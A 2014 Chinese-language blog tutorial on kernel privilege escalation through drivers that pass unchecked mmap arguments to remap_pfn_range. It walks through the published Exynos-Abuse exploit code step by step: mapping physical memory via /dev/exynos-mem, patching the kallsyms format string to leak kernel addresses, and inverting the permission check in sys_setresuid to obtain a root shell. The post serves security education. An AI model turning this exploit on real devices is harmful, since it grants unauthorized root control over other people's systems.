---
layout: post
title: "Privilege Escalation in Kernel 101 - mmap"
date: 2014-03-14 20:39:36 +0530
comments: true
categories: 
---

Privilege Escalation 101
========================

mmap&remap_pfn_range
---------------

#漏洞成因
在一段时期,各个厂商经常出现的漏洞中其中之一就是通过mmap控制全部物理内存.而出现这个问题的原因就是驱动开发人员没有正确地对remap_pfn_range这个函数中的参数做处理.

[mmap man page](http://linux.die.net/man/2/mmap)

[remap_pfn_range 使用方法](http://www.makelinux.net/ldd3/chp-15-sect-2)

下面是mmap的linux API,它的作用是将指定地址和大小的内存映射到用户空间中以便程序进行内存操作,offset传入需要映射的物理地址偏移,length传入需要映射的长度.

```c
void *mmap(void *addr, size_t length, int prot, int flags,
           int fd, off_t offset);
```
**The mmap function asks to map length bytes starting  at offset  offset from  the  file  (or  other object) specified by the file descriptor fd into memory, preferably at address start.  This  latter  address  is  a hint  only,  and is usually specified as 0.  The actual place where the object is mapped is returned by mmap, and is never 0.**

mmap是用户空间对内核请求映射内存的一个接口,调用这个接口后如果相关驱动支持此操作,会实现一个响应mmap的函数,一般情况下会在这个响应函数中调用remap_pfn_range,下面是linux man page上对remap_pfn_range的一个简单示例：

```c
static int simple_remap_mmap(struct file *filp, struct vm_area_struct *vma)
{
    if (remap_pfn_range(vma, vma->vm_start, vm->vm_pgoff,
                vma->vm_end - vma->vm_start,
                vma->vm_page_prot))
        return -EAGAIN;

    vma->vm_ops = &simple_remap_vm_ops;
    simple_vma_open(vma);
    return 0;
}
```
如果这段代码被直接用到驱动上,问题就来了,因为vma中的参数是根据用户空间调用mmap时传入的参数构造而成.用户空间可以传入内核代码段的物理地址,并将其标识为可读写,从而修改内核空间的代码.
 
#保护机制

一个程序的内存空间可以分为两个部分,用户空间（user space）、内核空间（kernel space）,在正常情况下,操作系统中运行的程序只能够控制自身用户空间的内存,而内核空间是由操作系统控制,且运行在特权模式.一个程序的凭据（credential）保存了自身uid、权限等信息,而凭据储存在内核空间,所以运行在用户空间的普通程序无法修改自身的凭据,这就是linux的权限控制的一部分,它保证了操作系统的安全性.

```
|--------------|
| kernel space |
|--------------|
| user space   |
|--------------|
```
##获取全部物理地址的操作能力后提权思路
由于系统中存在能够在用户空间操作所有内存（包括内核地址内存）时,普通程序通过修改内核代码段的机器码即可让内核执行任意命令,从而达到提权的目的.

  
#具体案例Exynos-Abuse 
Exynos-Abuse是其中一个最典型的案例,而且这个漏洞的利用代码也早早地公布了出来,从公布的利用代码来对这类漏洞的利用方式进行分析是最有效的方法.

[Exynos-Abuse完整利用代码](https://raw.githubusercontent.com/mwrlabs/mercury-modules/master/metall0id/root/exynosmem/exynos-abuse/jni/exynos-abuse.c)
##获取全部物理地址的操作能力
根据之前介绍过的一样,这个漏洞的利用方式第一步就是**获取全部物理地址的操作能力**,也就是下面这段代码做的工作：

程序打开有漏洞的驱动后,通过mmap调用了内存映射的方法,参数中length和PHYS_OFFSET是至关重要的两个参数.

```c
  #define PHYS_OFFSET 0x40000000
    ......
  int page_size = sysconf(_SC_PAGE_SIZE);
  int length = page_size * page_size;
    ......
    /* open the door */
  fd = open("/dev/exynos-mem", O_RDWR);//打开有漏洞的驱动
  if (fd == -1) {
    printf("[!] Error opening /dev/exynos-mem\n");
    exit(1);
  }

    /* kernel reside at the start of physical memory, so take some Mb */
  paddr = (unsigned long *)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, PHYS_OFFSET);//调用驱动的mmap对应接口,传入kernel text的起始物理地址
  tmp = paddr;
  if (paddr == MAP_FAILED) {
     printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
     exit(1);
  }
```
要定位到想要修改的函数地址就需要获取内核符号表,一般情况下在执行打印内核符号表的函数时由于/proc/sys/kptr_restrict的限制,所有符号表地址都会打印为0,.在内核数据段中寻找字符串"%pK %c %s\n",并将其修改为"%p %c %s\n",可以绕过此限制将内核函数的正确地址打印出来.

```c
    /*
     * search the format string "%pK %c %s\n" in memory
     * and replace "%pK" by "%p" to force display kernel
     * symbols pointer
     修改内核符号表打印函数中的"%pK %c %s\n",并将其修改为"%p %c %s\n"
     */
    for(m = 0; m < length; m += 4) {
        if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
            printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
            restore_ptr_fmt = tmp;
            *(unsigned long*)tmp = 0x20207025;//找到格式化字符串以后修改之
            found = true;
            break;
        }
        tmp++;
    }

    if (found == false) {
        printf("[!] s_show->seq_printf format string not found\n");
        exit(1);
    }
```
拿到内核符号表后就可以定位需要修改的系统调用setresuid的地址了,查找地址的方法为读取/proc/kallsyms的值,修改上面的格式化字符串后再访问改文件时,获取到的地址已经是正确的内核地址.

```c
    found = false;

    /* kallsyms now display symbols address */       
    kallsyms = fopen("/proc/kallsyms", "r");
    if (kallsyms == NULL) {
        printf("[!] kallsysms error: %s\n", strerror(errno));
        exit(1);
    }

    /* parse /proc/kallsyms to find sys_setresuid address */
    while((ptr = fgets(line, 512, kallsyms))) {
        str = strtok(ptr, " ");
        addr_sym = strtoul(str, NULL, 16);
        index = 1;
        while(str) {
            str = strtok(NULL, " ");
            index++;
            if (index == 3) {
                if (strncmp("sys_setresuid\n", str, 14) == 0) {
                    printf("[*] sys_setresuid found at 0x%08X\n",addr_sym);
                    found = true;
                }
                break;
            }
        }
```
找到setresuid的地址后开始搜索cmp r0,#0的机器码,找到后通过把setresuid中的cmp r0,#0,修改为cmp r0,#1将权限检查的逻辑取反.

```c
        if (found) {
            tmp = paddr;
            tmp += (addr_sym - PAGE_OFFSET) >> 2;
            for(m = 0; m < 128; m += 4) {
                if (*(unsigned long *)tmp == 0xe3500000) {
                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
                    restore_ptr_setresuid = tmp;
                    *(unsigned long *)tmp = 0xe3500001;
                    break;
                }
                tmp++;
            }
            break;
        }
    }
```
此时内核代码中setresuid的权限检查逻辑已经取反,之前没有权限执行setresuid的程序现在可以执行成功了.

```c
    fclose(kallsyms);

    /* to be sure memory is updated */
    usleep(100000);

    /* ask for root */
    result = setresuid(0, 0, 0);

    /* restore memory */
    *(unsigned long *)restore_ptr_fmt = 0x204b7025;
    *(unsigned long *)restore_ptr_setresuid = 0xe3500000;
    munmap(paddr, length);
    close(fd);

    if (result) {
        printf("[!] set user root failed: %s\n", strerror(errno));
        exit(1);
    }

    /* execute a root shell */
    execve (cmd[0], cmd, env);

  return 0;
}
```
当execve函数运行时该程序的uid已经设置为0,如果执行的命令为"/system/bin/sh",将会看到命令行的用户由"shell$"变成了"root#".
#小结
以上的例子是在32位系统中没有开启内核代码只读的情况下才能够利用成功,由于攻防的演进,后面Android系统增加了很多诸如内核代码只读、PXN等安全功能,使得漏洞的完美利用更加困难,但通过此例子可以很好的了解内核提权的步骤以及思路.
